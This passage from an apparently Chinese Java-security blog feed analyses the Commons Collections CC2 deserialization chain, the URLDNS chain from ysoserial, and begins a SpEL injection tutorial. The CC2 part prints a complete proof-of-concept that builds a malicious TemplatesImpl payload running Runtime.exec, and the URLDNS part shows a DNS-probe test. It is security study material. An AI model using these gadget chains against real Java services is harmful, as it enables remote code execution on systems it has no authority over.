class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001233443-2003682571.png" alt="image-20220429001232664"></p>
<p>可以看到_class[]为存放这Class类的数组，如果控制 <code>_class[_transletIndex]</code> 的值，使其指向我们精心构造的的类，那么，在执行<code>newInstance()</code> 实例化恶意类时，就会触发恶意代码执行</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001353700-1606609752.png" alt="image-20220429001353107"></p>
<h3 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h3><p>要想执行<code>newInstance()</code>方法，需要满足前面的条件，_name不为空</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001717315-1531884269.png" alt="image-20220429001716751"></p>
<p>在执行<code>newInstance()</code>方法前会进入 <code>defineTransletClasses()</code> 方法，进入</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002213373-1512772555.png" alt="image-20220429002212264"></p>
<p>在方法中，可以看到在414行代码处，会调用<code>load.defineClass()</code>，学过类加载的知识就知道这里时将 <code>_bytecodes[i]</code> 中的字节码转换成类，并且在下面的if语句中会对转换的类名进行了一个判断，判断父类的类名是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，满足的话就会将索引 <code>i</code> 赋给 <code>_transletIndex</code>，也就是说要想在下面调用newInstance()实例化恶意类，就需要满足我们这个恶意类继承<code>AbstractTranslet</code>。可以知道这里触发的关键在于<code>_bytecodes</code>的赋值，</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002817204-1446826639.png" alt="image-20220429002816622"></p>
<p>这里的思路是通过反射获取 <code>_bytecodes</code>，将恶意类的字节码添加到 <code>_bytecodes</code> 中作为一个元素，然后将字节码转换成类并添加到<code>_class[]</code>中，当调用 <code>TemplatesImpl.getTransletInstance()</code> 方法时，执行<code>_class[_transletIndex].newInstance()</code> 进行恶意类的实例化，从而执行恶意代码。</p>
<p>现在只需要找到调用<code>getTransletInstance()</code> 方法的地方</p>
<h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h3><p>在当前类中搜索<code>getTransletInstance()</code>，发现在<code>newTransformer()</code>方法中会调用<code>getTransletInstance()</code> </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003327280-1495473657.png" alt="image-20220429003326311"></p>
<p>可以利用<code>InvokerTransformer</code> 类里的可控反射来调用<code>getTransletInstance()</code> 方法，即构造如下利用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     InvokerTransformer.transform()</span><br><span class="line">      Method.invoke()</span><br><span class="line">       TemplatesImpl.newTransformer()</span><br><span class="line">        TemplatesImpl.getTransletInstance() -&gt; newInstance()</span><br><span class="line">         Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>

<p>构造的poc如下，和ysoserial的poc差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTestExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 设置通过 InvokerTransformer.transform() 调用 newTransformer() 方法 */</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformers);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过反射获取 PriorityQueue 对象中的 queue 数组,</span></span><br><span class="line"><span class="comment">         * 并将准备好的 TemplatesImpl 对象添加到这个 queue 数组中,</span></span><br><span class="line"><span class="comment">         * 以保证后续执行 InvokerTransformer.transform() 时成功调用 TemplatesImpl 对象中的 newTransformer() 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003934416-602778476.png" alt="image-20220429003933584"></p>
<p>调用链</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429010904215-2047324148.png" alt="image-20220429010903433"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA">https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">https://www.cnblogs.com/nice0e3/p/13860621.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之URLDNS链</title>
    <url>/2022/03/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>URLDNS链是ysoserial里面的一条简单的利用链，但URLDNS的利用效果是只能触发一次DNS请求，而不能去执行命令，比较适用于漏洞验证这一块。而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。</p>
<span id="more"></span>

<h3 id="反序列化漏洞成因"><a href="#反序列化漏洞成因" class="headerlink" title="反序列化漏洞成因"></a>反序列化漏洞成因</h3><p>序列化指把Java对象转换为字节序列的过程，反序列化就是打开字节流并重构对象，那如果即将被反序列化的数据是特殊构造的，就可以产生非预期的对象，从而导致任意代码执行。</p>
<p>Java中间件通常通过网络接收客户端发送的序列化数据，而在服务端对序列化数据进行反序列化时，会调用被序列化对象的readObject( )方法。而在Java中如果重写了某个类的方法，就会优先调用经过修改后的方法。如果某个对象重写了readObject( )方法，且在方法中能够执行任意代码，那服务端在进行反序列时，也会执行相应代码。如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p>
<h3 id="动态调试ysoserial"><a href="#动态调试ysoserial" class="headerlink" title="动态调试ysoserial"></a>动态调试ysoserial</h3><p>ysoserial jar : <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar</a></p>
<p>ysoserial 源码：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>下载源码，导入到IDEA中，刷新maven，下载好依赖，查看pom.xml，搜索mainClass可以找到入口类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324121703771-324482593.png" alt="image-20220324121703214"></p>
<p>进入到<code>GeneratePayload</code>，配置启动参数</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324121753313-1166989604.png" alt="image-20220324121752642"></p>
<p>再次运行就可以了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324145147757-1761601805.png" alt="image-20220324145146854"></p>
<p>下面分析下ysoserial是怎么生成序列化数据的</p>
<p>随便下个断点进入<code>Utils.getPayloadClass</code>方法中，代码就简单利用反射获取到了<code>URLDNS</code>的Class对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324145800406-140123450.png" alt="image-20220324145759828"></p>
<p>往下走就进入<code>getObject()</code>方法中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150429981-1549459291.png" alt="image-20220324150429427"></p>
<p><code>getObject()</code>方法中，创建了一个<code>hashmap</code>，并将URL对象当做map的key值，value值随意，最后还通过反射修改了<code>hashCode</code>的值为-1，这里修改的原因后面分析。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150612449-2075497477.png" alt="image-20220324150611827"></p>
<p>继续往下，就是调用<code>serialize()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150953783-367568477.png" alt="image-20220324150953288"></p>
<p>进入，可以看到这里就是将上一步返回的HashMap进行序列化输出至控制台</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324151039351-180380922.png" alt="image-20220324151038792"></p>
<h3 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h3><p>打开<code>ysoserial\payloads\URLDNS.java</code>，在源码的注释中可以看到对调用链的描述，翻译过来就是</p>
<blockquote>
<p>Java URL 类在其 equals 和 hashCode 方法上有一个有趣的属性。作为副作用，URL 类将在比较期间进行 DNS 查找（equals 或 hashCode）。作为反序列化的一部分，HashMap 在它反序列化的每个键上调用 hashCode，因此使用 Java URL 对象作为序列化键可以触发 DNS 查找</p>
</blockquote>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324122318357-1620163897.png" alt="image-20220324122317730"></p>
<p>调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>具体的调用过程，我们下断点调试看看，先生成序列化数据</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154308449-649122196.png" alt="image-20220324154308028"></p>
<p>简单写个反序列化入口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154622357-1287485145.png" alt="image-20220324154621771"></p>
<p>触发DNS查询</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154723880-915016525.png" alt="image-20220324154723458"></p>
<p>下面开始分析，根据上述的Gadget Chain，可见触发点是在<code>HashMap.readObject()</code>，来到<code>hashmap</code>的<code>readobject()</code>方法，然后一直F8，根据Gadget Chain发现使用了<code>putVal()</code>方法，但这不是重点，重点是会调用hash方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324163859435-892075761.png" alt="image-20220324163858671"></p>
<p>这里使用了hash方法对key的值进行了处理，我们来跟踪一下hash这个方法看看他具体的实现</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324163944218-1431329215.png" alt="image-20220324163943772"></p>
<p>如果key不是null就会调用<code>key.hashCode()</code>方法，跟进<code>hashCode()</code>方法，这里调用的是URL类中的<code>hashCode()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324164056332-755946695.png" alt="image-20220324164055912"></p>
<p>当<code>hashCode</code>值不为-1时就直接return，就不会触发<code>hashCode()</code>方法，也就不会触发接下来的DNS解析，这里<code>hashCode</code>值默认为 -1，所以会执行 <code>handler.hashCode(this)</code>，URLDNS链中也通过反射将<code>hashCode</code>的值设置为-1，也就是URLDNS的<code>getObject</code></p>
<p><code>()</code>方法中设置<code>hashCode</code>为-1的原因了。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150612449-2075497477.png" alt="image-20220324150611827"></p>
<p>看一下<code>handler</code>，是<code>URLStreamHandler</code>类（也是我们传入的<code>handler</code>），就是上面<code>URLStreamHandler</code>对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324164600472-371298152.png" alt="image-20220324164559978"></p>
<p>也就是说这里调用的是<code>URLStreamHandler.hashCode()</code>方法，跟进<code>hashCode()</code>方法，发现这里调用了<code>getHostAddress()</code>方法，见名思意就知道这里是做DNS查询</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165008570-1888846719.png" alt="image-20220324165008096"></p>
<p>跟进<code>getHostAddress()</code>方法，发现会调用<code>getHost()</code>方法发起DNS请求</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165205257-1212792639.png" alt="image-20220324165204708"></p>
<p>到此就结束了，调用链如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165333846-1590120445.png" alt="image-20220324165333365"></p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>分析过程中，发现<code>HashMap.put()</code>方法中也调用了<code>hash()</code>方法，然后去进行hashCode计算等</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325093950582-682409755.png" alt="image-20220325093950339"></p>
<p>那么就是说，在put操作的时候，也会触发对应的DNS解析，编写测试代码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094032155-510254520.png" alt="image-20220325094032461"></p>
<p>成功解析DNS</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094056740-1827988877.png" alt="image-20220325094056984"></p>
<p>但是，ysoserial在生成序列化数据的时候却并没有收到DNS解析，原因就在于继承抽象类<code>URLStreamHandler</code>的<code>SilentURLStreamHandler</code>类中，重写了<code>openConnection()</code>和<code>getHostAddress()</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094453594-1926599809.png" alt="image-20220325094453830"></p>
<p>因此在调用 put 方法的时候不会触发DNS 查询，下面编写测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class UrlDNStest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException &#123;</span><br><span class="line">        URLStreamHandler urlStreamHandler = new URLStreamHandler()&#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">            @Override</span><br><span class="line">            protected synchronized InetAddress getHostAddress(URL u)&#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(null, &quot;http://p8v57z.dnslog.cn&quot;, urlStreamHandler);</span><br><span class="line">        map.put(url, 2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325095447334-755455461.png" alt="image-20220325095447625"></p>
<p>根据之前分析之所以会产生后面的DNS解析的一个关键是<code>URL.hashCode</code>的值是-1，那么要想让<code>put()</code>方法不产生DNS解析，可以在put方法之前设置<code>hashCode</code>为一个不为-1的值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325105209097-556002660.png" alt="image-20220325105209379"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325105151233-82525919.png" alt="image-20220325105151582"></p>
<p>那为什么反序列化之后又可以进行DNS解析呢，这里查看URL类的源码，可以看到<code>handler</code>属性被设置为了<code>transient</code>，在反射的学习中可以知道，被设置了<code>transient</code>的是无法被序列化的，所以序列化的时候没有DNS解析。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325102243366-328457133.png" alt="image-20220325102243557"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>整个调用链梳理下就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt; URLStreamHandler.getHostAddress().InetAddress.getByName()</span><br></pre></td></tr></table></figure>

<p>可能存在反序列化漏洞的形式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.入口类的readObject直接调用危险方法。</span><br><span class="line">2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</span><br><span class="line">3.入口类参数中包含可控类，该类又调用其他危险方法的类，readObject时调用。</span><br><span class="line">比如类型定义为Object，调用equals/hashCode/toString方法等。重点相同类型，同名函数。</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html#0x03-urldns%E9%93%BE%E5%88%86%E6%9E%90">Java安全之URLDNS链 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/solitudi/article/details/117235572">https://blog.csdn.net/solitudi/article/details/117235572</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>URLDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>SpEL表达式注入学习</title>
    <url>/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="什么是SpEL表达式"><a href="#什么是SpEL表达式" class="headerlink" title="什么是SpEL表达式"></a>什么是SpEL表达式</h3><p>Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。<br> Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p>
<span id="more"></span>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
<h4 id="1、-Value"><a href="#1、-Value" class="headerlink" title="1、@Value"></a>1、@Value</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class EmailSender &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br><span class="line">    private String mailUsername;</span><br><span class="line">    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)    </span><br><span class="line">    private String defaultLocale;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、bean配置"><a href="#2、bean配置" class="headerlink" title="2、bean配置"></a>2、bean配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3、Expression"><a href="#3、Expression" class="headerlink" title="3、Expression"></a>3、Expression</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"> </span><br><span class="line">public class SpELTest &#123;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"> </span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //表达式放置</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;表达式&quot;);</span><br><span class="line">        //执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br><span class="line">        Object value = exp.getValue();</span><br><span class="line">        </span><br><span class="line">        /**如果使用其他的容器，则用下面的方法*/</span><br><span class="line">        //创建一个虚拟的容器EvaluationContext</span><br><span class="line">        StandardEvaluationContext ctx = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加bean</span><br><span class="line">        BeanA beanA = new BeanA();</span><br><span class="line">        ctx.setVariable(&quot;bean_id&quot;, beanA);</span><br><span class="line">        </span><br><span class="line">        //setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br><span class="line">        ctx.setRootObject(XXX);</span><br><span class="line">        </span><br><span class="line">        